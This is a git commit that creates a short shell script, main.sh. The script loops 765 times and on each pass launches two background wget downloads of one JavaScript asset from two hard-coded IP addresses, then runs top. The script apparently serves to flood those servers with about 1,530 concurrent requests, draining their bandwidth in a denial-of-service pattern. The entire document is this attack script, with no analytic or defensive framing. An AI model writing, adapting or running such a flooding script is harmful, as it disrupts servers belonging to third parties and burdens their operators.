8d16cf05537f0665c4622047e9faa64fd99c8e9d
xjh2009 <102580788+xjh2009@users.noreply.github.com>
2024-01-08 18:48:30 +0800

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,6 @@
+for ((i=1; i<=765; i++))  
+do  
+nohup wget -O sbzp http://111.173.106.99:10000/assets/mount-2ff9e259.js > /${i}-start.log 2>&1 &
+nohup wget -O sbzp http://42.202.34.146:10000/assets/mount-2ff9e259.js > /x${i}-start.log 2>&1 &
+done
+top
